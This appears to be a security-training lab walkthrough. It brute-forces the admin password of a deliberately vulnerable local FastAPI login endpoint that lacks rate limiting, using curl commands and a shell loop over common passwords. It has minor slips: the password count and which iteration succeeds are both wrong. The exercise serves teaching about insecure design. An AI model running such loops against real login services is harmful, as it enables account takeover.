## Prerequisites
First, ensure the vulnerable Python server is running with the following command:

```Bash
uvicorn vulnerable:app --reload
```

Exploitation Steps
The goal is to perform a Brute-Force Attack to guess the admin password by sending hundreds of requests in a few seconds.

1. Verify the Login Functionality
Confirm that the login endpoint works by sending a single incorrect guess.

```Bash
curl -X POST "http://127.0.0.1:8000/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "wrongpassword"}'
```

Expected Response: {"detail": "Invalid credentials"} (401 Unauthorized).

2. Perform the Exploit (Automated Brute-Force)
Since there is no rate limiting, an attacker can use a simple script or a loop to try many passwords. We will simulate this by sending several requests quickly.

```Bash
# A simple loop to try 5 different passwords in a row
for pwd in 123456 qwerty password admin secure123 password123; do
  curl -s -X POST "http://127.0.0.1:8000/login" \
       -H "Content-Type: application/json" \
       -d "{\"username\": \"admin\", \"password\": \"$pwd\"}" | grep "message"
done
```
3. Confirm the Success
Observe that the server allowed every single request until the correct password (secure123) was found.

Expected Response (on the final loop iteration):

```JSON
{
  "message": "Login successful"
}
```
Result: The attacker successfully discovered the password. The Insecure Design flaw was the lack of Rate Limiting or Account Lockout mechanisms, which allowed an automated tool to guess passwords until it succeeded.